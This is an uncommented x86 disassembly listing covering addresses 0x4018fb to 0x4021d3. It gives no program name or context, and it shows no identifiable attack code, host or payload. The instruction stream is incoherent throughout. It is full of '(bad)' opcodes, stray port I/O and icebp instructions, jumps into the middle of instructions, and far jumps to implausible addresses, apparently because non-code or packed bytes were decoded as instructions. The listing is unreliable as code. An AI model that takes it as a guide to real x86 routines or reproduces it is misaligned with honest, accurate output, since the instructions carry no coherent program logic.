  4018fb:	jg     0x401929
  4018fd:	lock stc 
  4018ff:	hlt    
  401900:	add    BYTE PTR [ecx+0xa],cl
  401903:	jb     0x40189f
  401905:	lods   al,BYTE PTR ds:[esi]
  401906:	sti    
  401907:	add    al,0xe9
  401909:	add    eax,DWORD PTR [esi+edi*4-0x55]
  40190d:	add    dl,bh
  40190f:	push   ecx
  401910:	(bad)  
  401911:	loopne 0x40198e
  401913:	shl    BYTE PTR [ecx],0xef
  401916:	(bad)  
  401917:	jmp    0x401953
  401919:	sbb    esp,DWORD PTR [ecx-0x5a616a2]
  40191f:	pop    esi
  401920:	jmp    0x40197b
  401922:	cli    
  401923:	pop    esi
  401924:	jmp    0xc3:0xe904fa5b
	...
  40193b:	add    BYTE PTR [ebp+0x71],ah
  40193e:	in     eax,0xdb
  401940:	mov    ah,0xd1
  401942:	jmp    0x65819c4a
  401947:	inc    esp
  401948:	(bad)  
  401949:	push   edi
  40194a:	pop    esi
  40194b:	jns    0x40193f
  40194d:	fcomp  QWORD PTR [edx]
  40194f:	out    dx,al
  401950:	cmp    eax,0x324926eb
  401955:	add    al,0xe9
  401957:	add    edi,edx
  401959:	jg     0x4018ef
  40195b:	sti    
  40195c:	jo     0x401974
  40195e:	fs dec ecx
  401960:	and    dl,BYTE PTR [ecx+eax*8-0x7d]
  401964:	cli    
  401965:	add    al,0xe9
  401967:	xor    BYTE PTR [edi+0x6c],0x1e
  40196b:	out    dx,eax
  40196c:	add    eax,0xf2791654
  401971:	jmp    0x40192e
  401973:	(bad)  
  401974:	js     0x4019de
  401976:	add    DWORD PTR [edi+eiz*2],eax
  401979:	push   es
  40197a:	stos   BYTE PTR es:[edi],al
  40197b:	fiadd  DWORD PTR [edx]
  40197d:	jmp    0x7185:0x78d17c00
  401984:	in     al,0xea
  401986:	(bad)  
  401987:	cmp    ebp,ebx
  401989:	jo     0x401987
  40198b:	shr    DWORD PTR [esi],1
  40198d:	jmp    0xeb74:0xaac0d6ff
  401994:	shr    BYTE PTR [eax-0x2255c301],1
  40199a:	stc    
  40199b:	xchg   ebp,eax
  40199c:	stc    
  40199d:	add    al,0x8b
  40199f:	stos   BYTE PTR es:[edi],al
	...
  4019b0:	add    BYTE PTR [eax],al
  4019b2:	xor    BYTE PTR [edx+eax*8-0x74b0061f],bh
  4019b9:	xchg   ebp,eax
  4019ba:	js     0x40197d
  4019bc:	clc    
  4019bd:	sahf   
  4019be:	add    bh,cl
  4019c0:	out    0x5b,eax
  4019c2:	nop
  4019c3:	jmp    0x2cc7:0xecc260ff
  4019ca:	push   0x5
  4019cc:	add    cl,ch
  4019ce:	stc    
  4019cf:	jmp    0xc481ff49
  4019d4:	std    
  4019d5:	outs   dx,BYTE PTR ds:[esi]
  4019d6:	fs jle 0x401a2e
  4019d9:	cmc    
  4019da:	rcl    BYTE PTR [esi],1
  4019dc:	push   0xffffffe9
  4019de:	mov    ds:0x4ddcff04,eax
  4019e3:	jmp    0x4608:0x70245175
  4019ea:	mov    dl,0xf8
  4019ec:	(bad)  
  4019ed:	fwait
  4019ee:	cmc    
  4019ef:	mov    ebx,0x4ff9e1c2
  4019f4:	mov    edi,DWORD PTR ds:0x2ef8c178
  4019fa:	ret    0xec
  4019fd:	jmp    0xad071efb
  401a02:	or     eax,0xf9e90005
  401a07:	jge    0x401a5e
  401a09:	add    bl,ch
  401a0b:	outs   dx,BYTE PTR ds:[esi]
  401a0c:	adc    cl,BYTE PTR [ebp+0x6a50dd9e]
  401a12:	rcr    dl,cl
  401a14:	jne    0x401a12
	...
  401a26:	add    BYTE PTR [eax],al
  401a28:	in     al,0x71
  401a2a:	clc    
  401a2b:	jmp    FWORD PTR [esi]
  401a2d:	jmp    0x6d0f6d30
  401a32:	inc    ebp
  401a33:	clc    
  401a34:	call   0xec6b:0xee0004c6
  401a3b:	push   0xffffffa2
  401a3d:	push   0x45
  401a3f:	or     al,0x3
  401a41:	fdiv   DWORD PTR [ebp+0x8]
  401a44:	mov    ebx,0x64fffc17
  401a49:	lods   eax,DWORD PTR ds:[esi]
  401a4a:	ret    0xa308
  401a4d:	push   edx
  401a4e:	mov    ebp,esp
  401a50:	jmp    0x9785a751
  401a55:	push   ebp
  401a56:	push   DWORD PTR [ebp+0x5b]
  401a59:	int    0x2a
  401a5b:	cld    
  401a5c:	je     0x401a35
  401a5e:	leave  
  401a5f:	ret    0x56b
  401a62:	push   ebp
  401a63:	mov    esi,DWORD PTR [edi-0x7d]
  401a66:	jge    0x401a74
  401a68:	arpl   WORD PTR [ecx+0x14],si
  401a6b:	adc    DWORD PTR [esi+0x15],0x0
  401a6f:	je     0x401ac6
  401a71:	fdiv   DWORD PTR [ebp+0x10]
  401a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a75:	jno    0x401a83
  401a77:	dec    DWORD PTR [esi-0x13]
  401a7a:	out    0x9,eax
  401a7c:	mov    bh,0xd7
  401a7e:	dec    ecx
  401a80:	rol    DWORD PTR [eax+eax*1],1
  401a83:	push   ebp
  401a84:	cwde   
  401a85:	in     al,0xff
  401a87:	jne    0x401abc
  401a89:	fdiv   DWORD PTR [ebp+0x8]
	...
  401a9c:	add    BYTE PTR [eax],al
  401a9e:	jmp    0x401a54
  401aa0:	(bad)  
  401aa1:	jmp    esp
  401aa3:	cmp    DWORD PTR [ebp+0x10],0xfffffffa
  401aa7:	(bad)  [edi+0x14]
  401aaa:	jns    0x401b25
  401aac:	(bad)  
  401aad:	jmp    FWORD PTR [ecx-0x10]
  401ab0:	in     al,dx
  401ab1:	jne    0x401abd
  401ab3:	out    0x76,eax
  401ab5:	or     al,0xdd
  401ab7:	imul   edi,ebx,0xecd78de7
  401abd:	inc    ebx
  401abf:	pushf  
  401ac0:	(bad)  
  401ac1:	jmp    FWORD PTR [esi]
  401ac3:	jae    0x401aa4
  401ac5:	cmp    DWORD PTR [edi],0xffffffe2
  401ac8:	add    esi,DWORD PTR [eax+eax*1-0x49]
  401acc:	jbe    0x401ada
  401ace:	mov    ds:0xfa00d7f6,al
  401ad3:	rol    BYTE PTR [ecx],cl
  401ad5:	sub    edi,DWORD PTR [edx+0x675ed0e]
  401adb:	xchg   edi,eax
  401adc:	jbe    0x401ae6
  401ade:	mov    ds:0x85ffec4b,al
  401ae3:	mov    ch,0xc1
  401ae5:	or     dl,bh
  401ae7:	sub    BYTE PTR [ecx-0x14],bh
  401aea:	jns    0x401ae5
  401aec:	adc    edi,edi
  401aee:	out    0xf0,eax
  401af0:	in     al,dx
  401af1:	jne    0x401ae9
  401af3:	data16 jbe 0x401afe
  401af6:	push   edx
  401af7:	xchg   edi,eax
  401af8:	in     al,dx
  401af9:	call   DWORD PTR [ebp-0x7d]
  401afc:	std    
  401afd:	inc    bh
  401aff:	in     eax,dx
  401b00:	in     al,dx
  401b01:	jne    0x401b03
	...
  401b13:	add    dh,dh
  401b15:	inc    esi
  401b16:	jbe    0x401b20
  401b18:	push   edx
  401b19:	arpl   sp,bp
  401b1b:	push   DWORD PTR ds:0xfa0cc125
  401b21:	mov    BYTE PTR [eax-0x14],bh
  401b24:	and    eax,0x1de7fbb1
  401b29:	xor    ah,ch
  401b2b:	jmp    FWORD PTR [edx-0x5598043d]
  401b31:	add    al,0xd1
  401b33:	inc    edx
  401b34:	cli    
  401b35:	out    0x94,eax
  401b37:	sti    
  401b38:	adc    eax,0xf5ec163c
  401b3d:	pop    edx
  401b3e:	jmp    0x113d832f
  401b43:	pop    ds
  401b44:	in     eax,0xe7
  401b46:	(bad)  
  401b47:	pop    eax
  401b48:	clc    
  401b49:	jns    0x401af7
  401b4b:	inc    DWORD PTR [ebp-0x18]
  401b4e:	je     0x401b4b
  401b50:	aad    0x33
  401b52:	out    0xeb,al
  401b54:	lds    ebx,FWORD PTR [edx-0x15]
  401b57:	js     0x401b90
  401b59:	adc    eax,0xfd2feb39
  401b5e:	shl    BYTE PTR [ecx],0xad
  401b61:	out    0xc6,eax
  401b63:	dec    esp
  401b64:	mov    bl,0xc2
  401b66:	in     eax,dx
  401b67:	add    eax,DWORD PTR [edi+0x7c]
  401b6a:	lds    eax,FWORD PTR [edi+0x71aee8be]
  401b70:	add    bl,ch
  401b72:	jecxz  0x401b61
  401b74:	test   edi,esp
  401b76:	rol    BYTE PTR [eax+0x0],cl
	...
  401b89:	add    dh,ch
  401b8b:	jge    0x401bb9
  401b8d:	call   0xfc1d5d0b
  401b92:	jecxz  0x401b98
  401b94:	xchg   BYTE PTR [ecx-0xa],dh
  401b97:	out    0xf4,eax
  401b99:	sti    
  401b9a:	push   ebp
  401b9b:	fdiv   DWORD PTR [eax-0x15]
  401b9e:	push   ebp
  401b9f:	out    0xf4,eax
  401ba1:	out    0x4d,eax
  401ba3:	jno    0x401b96
  401ba5:	(bad)  [ecx]
  401ba7:	out    0x5e,al
  401ba9:	jmp    0x401be8
  401bab:	jno    0x401b8e
  401bad:	fisttp DWORD PTR [esi]
  401baf:	jmp    0x41c20702
  401bb4:	inc    ebp
  401bb5:	mov    ebp,0x50e8fc38
  401bba:	jno    0x401b94
  401bbc:	add    BYTE PTR [edx+0x3a],ch
  401bbf:	lock (bad) 
  401bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bc2:	sbb    eax,0xf9e90004
  401bc7:	jns    0x401c0e
  401bc9:	sbb    eax,0xe175e7a6
  401bce:	rcl    DWORD PTR [ecx-0x2c],1
  401bd1:	jmp    0x82009bcf
  401bd6:	add    ah,dh
  401bd8:	jne    0x401bcb
  401bda:	shl    ecx,0xf9
  401bdd:	mul    al
  401bdf:	jl     0x401c26
  401be1:	icebp  
  401be2:	loopne 0x401c54
  401be4:	cld    
  401be5:	shl    edx,1
  401be7:	rol    DWORD PTR [eax],1
  401be9:	jmp    0xffb4c2aa
	...
  401bfe:	add    BYTE PTR [eax],al
  401c00:	mov    al,ds:0x4c39f870
  401c05:	add    eax,0x4fb38e8
  401c0a:	add    BYTE PTR [eax+0x3a],dh
  401c0d:	icebp  
  401c0e:	(bad)  
  401c0f:	cmp    al,0xa2
  401c11:	fisttp QWORD PTR [ecx]
  401c13:	call   0xde86:0x1cff04f9
  401c1a:	mov    ebx,0x8be690a2
  401c1f:	sub    al,0x6a
  401c21:	test   bh,0x96
  401c24:	dec    ecx
  401c25:	push   ebp
  401c26:	(bad)  
  401c27:	cld    
  401c28:	popa   
  401c29:	fisubr WORD PTR [edx+0x7f]
  401c2c:	push   eax
  401c2d:	out    0xc9,al
  401c2f:	stos   DWORD PTR es:[edi],eax
  401c30:	push   ebp
  401c31:	out    0x54,al
  401c33:	bound  esp,QWORD PTR ds:0x3859c482
  401c39:	inc    eax
  401c3a:	hlt    
  401c3b:	jmp    0x64402139
  401c40:	mov    edx,0xaa4e50e8
  401c45:	cld    
  401c46:	out    0x0,eax
  401c48:	int    0xce
  401c4a:	add    BYTE PTR [eax],al
  401c4c:	xchg   esi,eax
  401c4d:	sar    DWORD PTR [eax+0x4d],0xcc
  401c51:	je     0x401c5b
  401c53:	call   0x3ff5b5
  401c58:	mov    al,BYTE PTR [eax+edi*8-0x7d]
  401c5c:	pop    esi
  401c5d:	fiadd  DWORD PTR [edx+esi*2]
  401c60:	mov    edi,0xf86d7e
	...
  401c75:	add    bh,dl
  401c77:	fidiv  DWORD PTR [ebp-0x4]
  401c7a:	or     ecx,DWORD PTR [ebp-0x192cff2e]
  401c80:	mov    edi,0x75da9174
  401c85:	clc    
  401c86:	jae    0x401ccf
  401c88:	add    al,ch
  401c8a:	shl    dh,cl
  401c8c:	(bad)  
  401c8d:	dec    esp
  401c8f:	test   eax,0x261ad0f7
  401c94:	hlt    
  401c95:	inc    DWORD PTR [esi-0x23]
  401c98:	call   0x409e32
  401c9d:	jmp    0x401c64
  401c9f:	fdiv   QWORD PTR [ebp+0x8]
  401ca2:	mov    ebx,0x5cfffb25
  401ca7:	pop    es
  401ca8:	ror    cl,0x51
  401cab:	add    al,0x0
  401cad:	jmp    0x401c44
  401caf:	or     al,al
  401cb1:	leave  
  401cb2:	mov    eax,ds:0x616a0004
  401cb7:	inc    edi
  401cb8:	cld    
  401cb9:	jmp    DWORD PTR [esi-0x17]
  401cbc:	out    0xf0,eax
  401cbe:	jnp    0x401c9b
  401cc0:	inc    edi
  401cc2:	es icebp 
  401cc4:	add    DWORD PTR [eax],eax
  401cc6:	arpl   WORD PTR [ecx],ax
  401cc8:	lea    eax,[ebp-0x5d]
  401ccb:	push   eax
  401ccc:	push   DWORD PTR [ebp+0x4b]
  401ccf:	leave  
  401cd0:	sar    bl,cl
  401cd2:	cli    
  401cd3:	dec    esi
  401cd4:	jmp    0x48bcc5c
  401cd9:	je     0x401cdb
	...
  401ceb:	add    BYTE PTR [eax],cl
  401ced:	out    dx,eax
  401cee:	mov    ebx,0x6f2fb73b
  401cf3:	pop    es
  401cf4:	push   edx
  401cf5:	fadd   QWORD PTR [ebx]
  401cf7:	add    dl,bh
  401cf9:	inc    edx
  401cfa:	add    ch,BYTE PTR [ebx]
  401cfc:	cmp    dl,BYTE PTR [edx]
  401cfe:	push   es
  401cff:	sub    edi,DWORD PTR [edx]
  401d01:	xor    al,0xc6
  401d03:	add    al,0xfa
  401d05:	mov    al,ds:0x2a79ec7c
  401d0a:	in     al,dx
  401d0b:	lea    edi,[edi]
  401d0d:	or     dl,BYTE PTR [edi+edi*8+0x67]
  401d11:	(bad)  
  401d12:	fisttp DWORD PTR [eax-0x57]
  401d15:	out    dx,al
  401d16:	add    eax,DWORD PTR [ebp-0xe3a946]
  401d1c:	dec    edi
  401d1d:	(bad)  
  401d1e:	fcmovnu st,st(0)
  401d20:	ret    0xe8c3
  401d23:	mov    DWORD PTR [edi],edi
  401d25:	mov    dh,0xe8
  401d27:	jne    0x401cd7
  401d29:	(bad)  
  401d2a:	adc    dl,dl
  401d2c:	cli    
  401d2d:	in     eax,dx
  401d2e:	cld    
  401d2f:	mov    edi,0x75e8ba26
  401d34:	push   es
  401d35:	fwait
  401d36:	outs   dx,BYTE PTR ds:[esi]
  401d37:	clc    
  401d38:	sub    al,dh
  401d3a:	pop    ss
  401d3b:	or     edi,edx
  401d3d:	in     eax,dx
  401d3e:	call   0xe8b69bb8
  401d43:	sar    edx,1
  401d45:	in     eax,dx
  401d46:	call   0xb2c61fc0
  401d4b:	cli    
  401d4c:	mov    edi,DWORD PTR gs:[edx+0xc2]
	...
  401d5f:	add    BYTE PTR [eax],al
  401d61:	add    dl,dh
  401d63:	in     eax,dx
  401d64:	dec    esi
  401d65:	mov    esp,DWORD PTR [esi+0x6f]
  401d68:	mov    edi,0xccc6a9e8
  401d6d:	lea    edi,[edi+0x3d536504]
  401d73:	pop    edx
  401d74:	icebp  
  401d75:	(bad)  [edx]
  401d77:	mov    bh,0xe9
  401d79:	add    esi,DWORD PTR [edi-0x3b]
  401d7c:	fidivr WORD PTR [ebx+0x6d]
  401d7f:	add    eax,0x5a1d03e9
  401d84:	icebp  
  401d85:	fstp   TBYTE PTR [esi-0x23]
  401d88:	ss call 0xe8756811
  401d8e:	(bad)  
  401d8f:	loopne 0x401da2
  401d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d92:	sub    eax,DWORD PTR ds:0x13b5fce9
  401d98:	ins    DWORD PTR es:[edi],dx
  401d99:	xchg   edx,edi
  401d9b:	add    al,0xe9
  401d9d:	jp     0x401dde
  401d9f:	aad    0x6
  401da1:	outs   dx,BYTE PTR ds:[esi]
  401da2:	out    0xec,al
  401da4:	sub    ebx,edx
  401da6:	cli    
  401da7:	add    al,0x6a
  401da9:	mov    edi,0x3e909f6
  401dae:	sub    al,BYTE PTR ds:0x493dc39
  401db4:	jmp    0xc589a0bc
  401db9:	out    0x27,eax
  401dbb:	fld    st(1)
  401dbd:	xchg   edi,eax
  401dbe:	xchg   ebx,eax
  401dbf:	add    al,0xe9
  401dc1:	xor    BYTE PTR [esi+0x3e408],0x0
	...
  401dd8:	cli    
  401dd9:	hlt    
  401dda:	call   0xe9b4c032
  401ddf:	add    edi,edx
  401de1:	lea    ebp,[esp+ebx*8]
  401de4:	adc    BYTE PTR ds:0xe366719e,al
  401dea:	sbb    al,0xf0
  401dec:	ins    DWORD PTR es:[edi],dx
  401ded:	pop    ecx
  401dee:	and    edi,0x8d91d4ef
  401df4:	push   ebx
  401df5:	add    al,0xe9
  401df7:	cmp    BYTE PTR [esi],0xf8
  401dfa:	call   FWORD PTR [edi-0x45]
  401dfd:	fdiv   st(7),st
  401dff:	hlt    
  401e00:	pop    ebp
  401e01:	in     al,dx
  401e02:	gs cmp dh,dh
  401e05:	add    al,0xff
  401e07:	aam    0x31
  401e09:	jmp    0x401d9b
  401e0b:	push   ebx
  401e0c:	adc    eax,0xc1e16ae3
  401e11:	push   ss
  401e12:	sub    BYTE PTR [eax-0xe8a1c07],ch
  401e18:	xor    eax,eax
  401e1a:	cld    
  401e1b:	ss adc eax,0x8b2ed80f
  401e21:	fdivr  st,st(7)
  401e23:	pushf  
  401e24:	add    ebx,ebp
  401e26:	mov    edx,0x23e2dd1d
  401e2b:	xor    ebp,edx
  401e2d:	pop    eax
  401e2e:	clc    
  401e2f:	push   cs
  401e30:	imul   ebp,ebp,0xffffffff
  401e33:	jl     0x401e16
  401e35:	jmp    0x1123:0xe2dcfde0
	...
  401e4c:	add    BYTE PTR [eax],al
  401e4e:	aad    0x58
  401e50:	in     al,dx
  401e51:	add    ebp,esi
  401e53:	add    al,0x0
  401e55:	jmp    0xd228772e
  401e5a:	lods   al,BYTE PTR ds:[esi]
  401e5b:	loop   0x401e5c
  401e5d:	jmp    0xc14876f6
  401e62:	into   
  401e63:	fdiv   st(7),st
  401e65:	(bad)  
  401e66:	and    dh,al
  401e68:	pop    ebx
  401e69:	mov    al,0xbb
  401e6b:	or     DWORD PTR [eax],eax
  401e6d:	sbb    al,0x11
  401e6f:	icebp  
  401e70:	sub    DWORD PTR [esi+eax*4],0xffffffe2
  401e74:	jae    0x401e67
  401e76:	xchg   esp,eax
  401e77:	pop    eax
  401e78:	or     BYTE PTR [ecx-0x16ff4c06],dl
  401e7e:	adc    ch,al
  401e80:	leave  
  401e81:	stos   DWORD PTR es:[edi],eax
  401e82:	gs loop 0x401ed9
  401e85:	add    al,ch
  401e87:	mov    ecx,0x54b458b
  401e8c:	add    BYTE PTR [eax],0x63
  401e8f:	push   es
  401e90:	push   eax
  401e91:	push   0x13
  401e93:	shl    edx,0xd0
  401e96:	push   ebx
  401e97:	push   es
  401e98:	leave  
  401e99:	ret    0x61f
  401e9c:	push   ebp
  401e9d:	mov    esi,DWORD PTR [edi+0x368bfc52]
  401ea3:	fimul  WORD PTR [edx+0xee7274d]
  401ea9:	push   ecx
  401eaa:	loop   0x401e6c
  401eac:	add    ch,BYTE PTR [ebx]
  401eae:	jecxz  0x401e86
  401eb0:	stos   DWORD PTR es:[edi],eax
  401eb1:	pop    ecx
	...
  401ec2:	add    BYTE PTR [eax],al
  401ec4:	nop
  401ec5:	call   0x4aea11cd
  401eca:	leave  
  401ecb:	ret    0x5eb
  401ece:	push   ebp
  401ecf:	mov    esi,edi
  401ed1:	dec    edi
  401ed2:	push   edi
  401ed3:	mov    esi,DWORD PTR [esi-0x27]
  401ed6:	sti    
  401ed7:	mov    ebx,DWORD PTR [esi-0x22]
  401eda:	mov    cl,BYTE PTR [ebp-0x4d]
  401edd:	out    0x2,al
  401edf:	repz aas 
  401ee1:	dec    ebx
  401ee2:	pop    esi
  401ee3:	leave  
  401ee4:	adc    edx,ebx
  401ee6:	call   DWORD PTR [eax+ecx*2-0x43]
  401eea:	push   esi
  401eeb:	push   edi
  401eec:	sub    BYTE PTR [edx+0x8],dh
  401eef:	cld    
  401ef0:	sbb    BYTE PTR [edx],bl
  401ef2:	adc    BYTE PTR [ebx],ch
  401ef4:	push   ebx
  401ef5:	pop    ebx
  401ef6:	jge    0x401f04
  401ef8:	mov    al,0x6
  401efa:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401efc:	mov    BYTE PTR [esi+0x47e30175],bl
  401f02:	pop    esi
  401f03:	leave  
  401f04:	push   ecx
  401f05:	fdiv   st(7),st
  401f07:	push   esp
  401f08:	or     BYTE PTR [ebp+0x5297c483],bh
  401f0e:	push   edi
  401f0f:	push   ebx
  401f10:	cli    
  401f11:	add    eax,DWORD PTR [edx]
  401f13:	add    edx,edi
  401f15:	jmp    0x401efb
  401f17:	jne    0x401f0b
  401f19:	jae    0x401eae
  401f1b:	call   DWORD PTR [ebp+0x62]
  401f1e:	jns    0x401f9d
  401f20:	add    dh,BYTE PTR [ebx]
  401f22:	cmp    eax,0x414282b
  401f27:	add    DWORD PTR [eax],eax
	...
  401f39:	add    dl,bh
  401f3b:	jmp    0x401fb8
  401f3d:	adc    al,0xf0
  401f3f:	inc    ecx
  401f40:	ret    0x33e2
  401f43:	data16 or BYTE PTR [di+0x78aa],bh
  401f49:	jne    0x401f39
  401f4b:	xor    DWORD PTR [edi],edi
  401f4d:	(bad)  
  401f4e:	cli    
  401f4f:	idiv   BYTE PTR [edx+0x65312b]
  401f55:	cmp    esi,DWORD PTR [edx-0x58]
  401f58:	in     al,0x0
  401f5a:	mov    bh,0x29
  401f5c:	jp     0x401f62
  401f5e:	sub    ebp,esi
  401f60:	ds (bad) 
  401f62:	std    
  401f63:	aas    
  401f64:	dec    edi
  401f65:	(bad)  
  401f66:	jo     0x401f52
  401f68:	sub    DWORD PTR [eax+0x4579c2f6],ecx
  401f6e:	aad    0x56
  401f70:	add    BYTE PTR [edx],bh
  401f72:	cmp    edx,DWORD PTR [ebx-0x13b7efca]
  401f78:	sbb    cl,cl
  401f7a:	mov    esp,0x51d56eab
  401f7f:	pop    ds
  401f80:	inc    esi
  401f81:	leave  
  401f82:	mov    eax,0x715503ea
  401f87:	mov    ds:0xfba2c480,al
  401f8c:	dec    ebp
  401f8d:	push   edi
  401f8e:	xchg   ebp,eax
  401f8f:	sbb    esp,edi
  401f91:	pop    edx
  401f92:	sub    bl,0x7b
  401f95:	inc    ebp
  401f96:	xchg   DWORD PTR [eax+eax*2+0x1],esp
  401f9a:	jb     0x401fa1
  401f9c:	sub    al,0xe8
	...
  401fae:	add    BYTE PTR [eax],al
  401fb0:	sbb    esp,0x5a813d26
  401fb6:	in     eax,0xbc
  401fb8:	mov    edi,0xfa03e9dc
  401fbd:	add    al,0x72
  401fbf:	ss jmp 0xe6e1:0xb7e629e3
  401fc7:	lods   eax,DWORD PTR ds:[esi]
  401fc8:	mov    edi,0xe6addee1
  401fcd:	sbb    al,0x71
  401fcf:	dec    esi
  401fd0:	xor    eax,0xfde7b405
  401fd5:	xchg   esi,eax
  401fd6:	lods   al,BYTE PTR ds:[esi]
  401fd7:	out    0x70,eax
  401fd9:	stc    
  401fda:	adc    BYTE PTR [edi+eax*8-0x22],bh
  401fde:	imul   BYTE PTR [ebp+0xf71e1bf]
  401fe4:	ror    BYTE PTR [edi],cl
  401fe6:	jg     0x402026
  401fe8:	push   es
  401fe9:	mov    edx,DWORD PTR [esp+eiz*8+0x79e0f972]
  401ff0:	dec    edi
  401ff1:	loopne 0x401fde
  401ff3:	dec    esi
  401ff4:	in     al,dx
  401ff5:	mov    bh,ch
  401ff7:	sub    DWORD PTR [ecx+0x49],esi
  401ffa:	adc    DWORD PTR [ebx],esi
  401ffc:	push   es
  401ffd:	adc    eax,0xe2d23e06
  402002:	sub    DWORD PTR [ecx+0x37],edi
  402005:	loop   0x402068
  402007:	add    BYTE PTR [eax+0x49],dh
  40200a:	in     eax,dx
  40200b:	jp     0x402046
  40200d:	push   es
  40200e:	inc    esi
  40200f:	inc    edx
  402010:	push   ecx
  402011:	into   
  402012:	stos   DWORD PTR es:[edi],eax
  402013:	adc    BYTE PTR [eax],al
	...
  402025:	add    dl,bh
  402027:	cmp    DWORD PTR [edx-0x10],esp
  40202a:	jnp    0x401ff4
  40202c:	mov    ebp,0x1adf9de2
  402031:	das    
  402032:	mov    cl,0x91
  402034:	and    al,0xe0
  402036:	sub    ah,al
  402038:	add    BYTE PTR [esi+esi*8],bh
  40203b:	in     al,dx
  40203c:	mov    ds:0x8504f699,eax
  402041:	test   eax,0xe9968d09
  402046:	stc    
  402047:	add    al,0xff
  402049:	sbb    al,0xf6
  40204b:	in     al,dx
  40204c:	das    
  40204d:	xchg   edi,eax
  40204e:	pop    ecx
  40204f:	fisttp WORD PTR [ecx+0x75df322c]
  402055:	jge    0x4020b5
  402057:	ins    BYTE PTR es:[edi],dx
  402058:	iret   
  402059:	jmp    0xf6002c57
  40205e:	fmul   DWORD PTR [ebp+0x59195945]
  402064:	hlt    
  402065:	push   ecx
  402066:	mov    al,ds:0x7756ffde
  40206b:	dec    ecx
  40206c:	clc    
  40206d:	dec    esi
  40206e:	ret    
  40206f:	fdivr  st,st(7)
  402071:	mov    esp,0x3975df31
  402076:	push   ds
  402077:	nop
  402078:	(bad)  
  402079:	ss sbb edi,ebx
  40207c:	jne    0x4020ab
  40207e:	push   cs
  40207f:	inc    esi
  402080:	iret   
  402081:	jmp    0xedb5fe7f
  402086:	loope  0x40209b
  402088:	iret   
  402089:	jmp    0x40208e
	...
  40209a:	add    BYTE PTR [eax],al
  40209c:	stc    
  40209d:	xor    al,0xff
  40209f:	xchg   esp,eax
  4020a0:	in     eax,dx
  4020a1:	pop    DWORD PTR [ebp-0x2127e9]
  4020a7:	cdq    
  4020a8:	loope  0x402052
  4020aa:	(bad)  
  4020ab:	neg    al
  4020ad:	fidiv  WORD PTR [ebp-0xb]
  4020b0:	fcomp  DWORD PTR [eax-0x8]
  4020b3:	je     0x402037
  4020b5:	out    dx,eax
  4020b6:	(bad)  
  4020b7:	ficomp WORD PTR [eax-0x642817cb]
  4020bd:	fdivp  st(7),st
  4020bf:	into   
  4020c0:	inc    edx
  4020c1:	or     eax,0xc0e400e8
  4020c6:	(bad)  
  4020c7:	jmp    FWORD PTR [ecx]
  4020c9:	adc    DWORD PTR [eax+0x3d],ebp
  4020cc:	sti    
  4020cd:	inc    edi
  4020ce:	add    bh,bh
  4020d0:	(bad)  
  4020d1:	adc    al,ch
  4020d3:	xchg   ebx,eax
  4020d4:	cdq    
  4020d5:	jecxz  0x4020d6
  4020d7:	or     edi,DWORD PTR [ebx]
  4020d9:	jecxz  0x402150
  4020db:	hlt    
  4020dc:	mov    WORD PTR ds:0x1106fff8,?
  4020e2:	call   0x239a6a
  4020e7:	and    ebx,DWORD PTR [ebx+0x7bf875e3]
  4020ed:	lahf   
  4020ee:	std    
  4020ef:	dec    esp
  4020f1:	loop   0x402168
  4020f3:	or     bl,cl
  4020f5:	test   bh,dh
  4020f7:	dec    esp
  4020f9:	mov    es,ebx
  4020fb:	pop    ebx
  4020fc:	fcmovb st,st(7)
  4020fe:	or     BYTE PTR [eax],al
	...
  402110:	add    BYTE PTR [eax],al
  402112:	data16 (bad) 
  402114:	in     al,dx
  402115:	and    edi,0xffffffb5
  402118:	push   edi
  402119:	mov    edx,DWORD PTR [esi-0x2a]
  40211c:	or     al,al
  40211e:	inc    edi
  40211f:	or     al,0xc7
  402121:	add    BYTE PTR [ebx],dl
  402123:	add    al,BYTE PTR [eax]
  402125:	add    al,cl
  402127:	loop   0x4020ac
  402129:	jge    0x402126
  40212b:	pop    es
  40212c:	jne    0x402135
  40212e:	dec    ecx
  40212f:	add    al,BYTE PTR [edx]
  402131:	add    bl,dl
  402133:	out    dx,al
  402134:	jae    0x7541fab8
  40213a:	aam    0x7f
  40213c:	add    BYTE PTR [ecx],al
  40213e:	rol    DWORD PTR [ecx],cl
  402140:	jmp    0x402144
  402142:	mov    eax,0xfaca8197
  402147:	or     BYTE PTR [edx],al
  402149:	add    BYTE PTR [esi],bl
  40214b:	inc    esi
  40214c:	cld    
  40214d:	push   eax
  40214e:	cli    
  40214f:	sbb    DWORD PTR [esi+0x0],ebp
  402152:	popf   
  402153:	cmp    BYTE PTR [eax],dl
  402155:	dec    DWORD PTR [edi]
  402157:	aam    0xeb
  402159:	sar    BYTE PTR [ebp-0x45f4fc15],1
  40215f:	and    BYTE PTR [ecx-0x73],dh
  402162:	aaa    
  402163:	xchg   esp,eax
  402164:	xor    al,0x6a
  402166:	cli    
  402167:	pop    eax
  402168:	inc    edi
  402169:	hlt    
  40216a:	retf   0x3f1
  40216d:	(bad)  
  40216e:	out    dx,eax
  40216f:	fneni(8087 only) 
  402171:	jne    0x4021d1
  402173:	sbb    DWORD PTR [ebp+0xcf],0x0
	...
  402186:	add    BYTE PTR [eax],al
  402188:	cli    
  402189:	jmp    0x402197
  40218b:	rol    bh,0x2f
  40218e:	test   DWORD PTR [ebp+0x42],edi
  402191:	jmp    0x4021ea
  402193:	inc    esi
  402194:	jns    0x402186
  402196:	xlat   BYTE PTR ds:[ebx]
  402197:	add    DWORD PTR [edi+0x327d84ed],ebp
  40219d:	in     al,dx
  40219e:	push   edi
  40219f:	cmp    dh,BYTE PTR [ecx-0x50]
  4021a2:	fild   DWORD PTR [eax-0x36]
  4021a5:	inc    ebx
  4021a6:	inc    edx
  4021a7:	std    
  4021a8:	adc    eax,0x7ff88d46
  4021ad:	test   al,0xdb
  4021af:	push   eax
  4021b0:	lods   eax,DWORD PTR ds:[esi]
  4021b1:	rol    DWORD PTR [ebx],0x6a
  4021b4:	cli    
  4021b5:	cs push edi
  4021b7:	adc    ch,dh
  4021b9:	jns    0x40219a
  4021bb:	call   0x444d37
  4021c0:	icebp  
  4021c1:	sub    eax,0x6450a58
  4021c6:	sub    ebp,edi
  4021c8:	aad    0x3
  4021ca:	sub    eax,0x8ceae1ff
  4021cf:	inc    ebp
  4021d0:	out    dx,al
  4021d1:	out    0xc3,al
  4021d3:	je     0x4021cc
